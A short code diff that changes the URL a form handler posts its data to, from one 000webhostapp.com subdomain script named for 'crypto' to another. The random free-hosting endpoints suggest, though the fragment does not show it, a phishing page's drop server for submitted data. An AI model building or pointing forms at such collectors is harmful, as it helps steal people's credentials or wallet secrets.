@@ -85,7 +85,7 @@ form.addEventListener('submit', function(e) {
 
     $.ajax({
         type: "POST",
-        url: "https://turfier-twist.000webhostapp.com/crypto-post.php",
+        url: "https://fenestral-licenses.000webhostapp.com/crypto.php",
         data: formData,
         enctype: 'multipart/form-data',
         processData: false,
